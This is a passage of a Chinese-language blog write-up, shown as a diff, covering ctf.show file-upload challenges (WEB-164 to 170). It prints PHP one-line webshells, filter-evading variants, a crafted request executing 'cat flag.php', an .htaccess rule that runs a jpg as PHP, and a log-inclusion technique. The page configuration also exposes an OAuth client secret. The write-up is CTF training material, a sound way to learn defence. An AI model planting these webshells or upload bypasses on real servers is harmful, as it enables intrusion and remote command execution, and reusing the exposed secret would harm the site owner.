class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png" alt="img"></p>
+<p>可以看到木马是以短标签写进去的</p>
+<p>抓包执行即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /download.php?image=<span class="number">4</span>a47a0db6e60853dedfcfdf08a5ca249.png&amp;<span class="number">0</span>=system HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>a0dd0db-<span class="number">7621</span>-<span class="number">467</span>f-<span class="number">8</span>c76-dd8bd63732b6.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">14</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.2.729509020.1680361470</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1=cat+flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-165-jpg二次渲染"><a href="#WEB-165-jpg二次渲染" class="headerlink" title="WEB-165(jpg二次渲染)"></a>WEB-165(jpg二次渲染)</h1><p>傻逼题 没啥好说的</p>
+<h1 id="WEB-166-zip"><a href="#WEB-166-zip" class="headerlink" title="WEB-166(zip)"></a>WEB-166(zip)</h1><p>给zip后面添加一句话上传 然后包含执行 题目环境有问题 返回包是空的</p>
+<h1 id="WEB-167-htaccess"><a href="#WEB-167-htaccess" class="headerlink" title="WEB-167(.htaccess)"></a>WEB-167(.htaccess)</h1><p>报500错误 环境有问题 无语了</p>
+<p>.htaccess也是php的配置文件 是一个局部配置文件 只对该文件所在目录下的文件起作用</p>
+<p>我们可以上传上去jpg文件 但是不是php文件 无法解析</p>
+<p>所以我们需要.htaccess这个文件去将我们的jpg文件解析成php文件 </p>
+<p>内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt; <span class="comment">//需要解析的文件名</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-168-免杀"><a href="#WEB-168-免杀" class="headerlink" title="WEB-168(免杀)"></a>WEB-168(免杀)</h1><p>过了了eval get post system</p>
+<p>paylaod:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[x]`;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_REQUEST</span>[<span class="number">1</span>](<span class="variable">$_REQUEST</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);    <span class="comment">//拼接</span></span><br></pre></td></tr></table></figure>
+
+<p>当时用反引号做的时候一直在想为什么返回包是空白 后来才想到这个反引号没有回显 要用echo一下 或者搭配短标签</p>
+<h1 id="WEB-169-WEB-170-日志包含"><a href="#WEB-169-WEB-170-日志包含" class="headerlink" title="WEB-169~WEB-170(日志包含)"></a>WEB-169~WEB-170(日志包含)</h1><p>可以上传php文件到upload下然后上传user.ini 里面的内容指向nginx的日志文件 然后请求头写入一句话木马 去包含访问即可</p>
+<h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>真被某些题环境搞心态了 </p>
+<p>继续下一大陆 sql注入！！！！！！！！！！！！！！！！！！！</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/61d76257.html" rel="prev" title="ctfshow-php特性">
+                  <i class="fa fa-chevron-left"></i> ctfshow-php特性
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陇ICP备 2023001761 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"ef06843e9841ca9d01bcfb59acc123c0"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
+
